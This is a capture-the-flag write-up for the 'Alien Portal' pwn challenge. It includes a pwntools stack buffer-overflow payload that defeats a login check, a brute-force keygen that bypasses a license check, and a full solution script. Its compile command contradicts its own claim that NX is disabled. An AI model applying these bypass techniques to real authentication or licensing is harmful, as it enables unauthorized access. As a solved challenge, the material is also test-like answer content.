## Challenge Name
-  Alien Portal ??
## Challenge Difficulty
- Medium
## Challenge Category
- pwn 
## Challenge Description
The fate of humanity rests in your hands. We've managed to infiltrate an alien login portal, and we believe that they're hiding a flag in there. Can you help us get in?



# Writeup
SHA256          F5B41336F1358289384582700D842DD5869AD62E19FF79B35FCF23EF633ACC83      vuln.exe
- The challenge is a 32-bit binary with no protections enabled (NX, ASLR, PIE, Stack Canary)
- Compile the binary with:
```
gcc -fno-stack-protector -z noexecstack -no-pie -m32 -o <challenge_name> vuln.c
```
- Ensure that the hash of the binary matches the hash provided 
- The challenge is a simple buffer overflow exploit to overwrite a variable on the stack followed by reversing the key generation algorithm and making a keygen
- Buffer Overflow (dynamic analysis)
    - use any dynamic analysis tool (gdb, redare ...) to obtain the exact number of padding to overwrite a strcmp variable
    - you can do this by checking the values of stack variables during each run of the program
    - after obtaining the number of padding, you will be able to control the exact value of the variable 
    ```python
    from pwn import *
    io = process("./test")
    PAYLOAD = 'A' * 74 + chr(1)
    ```
- Keygen (static analysis)
    - after passing the first stage of login, the participant will be told that there is a 2-factor authentication which requires a license/secret code
    - using static analysis(ghidra, ida ...), you can reverse engineer the key-checking algorithm and write a key generator
    ```python
    import random
    def encrypt_key(key):
        length_key = len(key)
        sum_key = 0
        for letter in key:
            sum_key += ord(letter)
        return sum_key * length_key

    while 1:
        key = ""
        for i in range(4):
            key += random.choice("abcdefghijklmnopqrstuvwxyz")
            if(encrypt_key(key) == 1804):
                print(key)
    ```
    - then you can pipe the key into the challenge and obtain your flag
# solution
```python
from pwn import *
io = process("./test")
# part 1
PAYLOAD = 'A' * 74 + chr(1)
# part 2
key = "yujk" 
io.sendline(PAYLOAD)
io.recvuntil(":")
io.sendline(key)
io.interactive()
```

